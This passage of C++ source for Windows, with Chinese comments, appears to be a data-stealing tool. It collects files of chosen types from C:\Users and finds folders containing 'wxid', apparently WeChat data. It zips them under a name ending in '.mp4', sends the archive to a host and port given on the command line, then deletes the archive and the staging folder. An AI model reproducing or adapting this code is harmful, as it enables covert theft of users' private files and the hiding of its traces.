		printf("%s\n", target2);
		CopyFile((LPCSTR)buffer, target2, TRUE);
		DWORD zResult = ZR_OK;
		HZIP hz = CreateZip(tempzip, 0);
		LPCTSTR lpszSrcPath = tempdir;
		zResult = DirToZip(hz, lpszSrcPath, _tcsclen(lpszSrcPath));
		CloseZip(hz);
		printf("Start Send........\n");
		send_file(tempzip, argv[2], (u_short)atoi(argv[3]));      
		if (remove(tempzip) == 0)
		{
			cout << "remove SucessFul" << endl;
		}
		return 0;
	}

	if (strcmp(argv[1], "user") == 0) {
		static TCHAR tempzip[MAX_PATH];
		static TCHAR tempdd[MAX_PATH];
		_getcwd(tempdd, MAX_PATH);
		lstrcat(tempdd, "\\userfile");
		_mkdir(tempdd);

		//TCHAR path[255];
		//获取当前用户的桌面路径
		//SHGetSpecialFolderPath(0, path, CSIDL_DESKTOPDIRECTORY, 0);

		for (int i = 0; i < length; i++) {
			FindFile((char *)"C:\\Users", (char *)"*.*", (char *)filetype[i], tempdd);
		}

		char strBuffer[256] = { 0 };
		//DWORD dwSize = 256;
		//GetUserName(strBuffer, &dwSize);
		strcat_s(HostName, "_");
		strcat_s(HostName, chIP);
		strcat_s(HostName, "_userfile");
		strcat_s(HostName, ".mp4");


		strcat_s(tempzip, HostName);
		strcat_s(tempzip, "_work_file");
		strcat_s(tempzip, ".mp4");
		printf(tempzip);
		DWORD zResult = ZR_OK;
		HZIP hz = CreateZip(tempzip, 0);
		LPCTSTR lpszSrcPath = tempdd;
		zResult = DirToZip(hz, lpszSrcPath, _tcsclen(lpszSrcPath));
		CloseZip(hz);
		if (argv[3]) {
			send_file(tempzip, argv[2], (u_short)atoi(argv[3]));

		}
		if (remove(tempzip) == 0)
		{
			cout << "remove SucessFul" << endl;
		}

		string ml = "";
		ml = "rmdir /s/q \"";
		ml += tempdd;
		system(ml.c_str());
	}

}

void getFileNames(string path, vector<string>& files)
{
	intptr_t hFile = 0;
	//文件信息
	struct _finddata_t fileinfo;
	string p;
	string::size_type idx;

	if ((hFile = _findfirst(p.assign(path).append("\\*").c_str(), &fileinfo)) != -1)
	{
		do
		{
			//如果是目录,匹配文件夹
			if ((fileinfo.attrib & _A_SUBDIR))
			{
				if (strstr(fileinfo.name, "wxid") != NULL)
					files.push_back(p.assign(path).append("\\").append(fileinfo.name));
			}

		} while (_findnext(hFile, &fileinfo) == 0);
		_findclose(hFile);
	}
}
